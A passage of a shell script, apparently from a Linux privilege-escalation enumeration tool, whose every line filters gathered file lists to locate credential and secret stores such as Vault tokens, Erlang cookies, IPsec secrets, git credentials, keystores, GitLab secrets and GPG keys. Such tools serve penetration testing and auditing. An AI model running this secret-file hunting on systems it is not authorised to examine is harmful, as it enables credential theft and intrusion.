  1235	  PSTORAGE_ELASTICSEARCH=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "elasticsearch\.y.*ml$" | sort | uniq | head -n 70)
  1236	  PSTORAGE_VAULT_SSH_HELPER=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "vault-ssh-helper\.hcl$" | sort | uniq | head -n 70)
  1237	  PSTORAGE_VAULT_SSH_TOKEN=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.vault-token$" | sort | uniq | head -n 70)
  1238	  PSTORAGE_COUCHDB=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "couchdb$" | sort | uniq | head -n 70)
  1239	  PSTORAGE_REDIS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "redis\.conf$" | sort | uniq | head -n 70)
  1240	  PSTORAGE_MOSQUITTO=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "mosquitto\.conf$" | sort | uniq | head -n 70)
  1241	  PSTORAGE_NEO4J=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "neo4j$" | sort | uniq | head -n 70)
  1242	  PSTORAGE_CLOUD_INIT=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "cloud\.cfg$" | sort | uniq | head -n 70)
  1243	  PSTORAGE_ERLANG=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.erlang\.cookie$" | sort | uniq | head -n 70)
  1244	  PSTORAGE_SIP=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "sip\.conf$|amportal\.conf$|FreePBX\.conf$|Elastix\.conf$" | sort | uniq | head -n 70)
  1245	  PSTORAGE_GMV_AUTH=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "gvm-tools\.conf$" | sort | uniq | head -n 70)
  1246	  PSTORAGE_IPSEC=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "ipsec\.secrets$|ipsec\.conf$" | sort | uniq | head -n 70)
  1247	  PSTORAGE_IRSSI=$(echo -e "$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.irssi$" | sort | uniq | head -n 70)
  1248	  PSTORAGE_KEYRING=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "keyrings$|.*\.keyring$|.*\.keystore$|.*\.jks$" | sort | uniq | head -n 70)
  1249	  PSTORAGE_VIRTUAL_DISKS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.vhd$|.*\.vhdx$|.*\.vmdk$" | sort | uniq | head -n 70)
  1250	  PSTORAGE_FILEZILLA=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_BIN\n$FIND_DIR_OPT\n$FIND_DIR_CDROM\n$FIND_DIR_MEDIA\n$FIND_DIR_SBIN\n$FIND_DIR_ETC\n$FIND_DIR_SNAP\n$FIND_DIR_SRV\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "filezilla$|filezilla\.xml$|recentservers\.xml$" | sort | uniq | head -n 70)
  1251	  PSTORAGE_BACKUP_MANAGER=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "storage\.php$|database\.php$" | sort | uniq | head -n 70)
  1252	  PSTORAGE_SPLUNK=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "passwd$" | sort | uniq | head -n 70)
  1253	  PSTORAGE_GIT=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "\.git-credentials$" | sort | uniq | head -n 70)
  1254	  PSTORAGE_ATLANTIS=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "atlantis\.db$" | sort | uniq | head -n 70)
  1255	  PSTORAGE_GITLAB=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E '/lib' | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "secrets\.yml$|gitlab\.yml$|gitlab\.rm$" | sort | uniq | head -n 70)
  1256	  PSTORAGE_PGP_GPG=$(echo -e "$FIND_SRV\n$FIND_OPT\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_VAR\n$FIND_APPLICATIONS\n$FIND_SYSTEM\n$FIND_SYS\n$FIND_CDROM\n$FIND_MNT\n$FIND_ETC\n$FIND_LIB\n$FIND_CONCOURSE_AUTH\n$FIND_PRIVATE\n$FIND_RUN\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_SNAP\n$FIND_CACHE\n$FIND_LIB64\n$FIND_USR\n$FIND_SBIN\n$FIND_TMP\n$FIND_LIB32\n$FIND_CONCOURSE_KEYS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E 'README.gnupg' | grep -E "^${ROOT_FOLDER}etc|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}media|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}bin|^$GREPHOMESEARCH|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}applications|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*\.pgp$|.*\.gpg$|.*\.gnupg$" | sort | uniq | head -n 70)
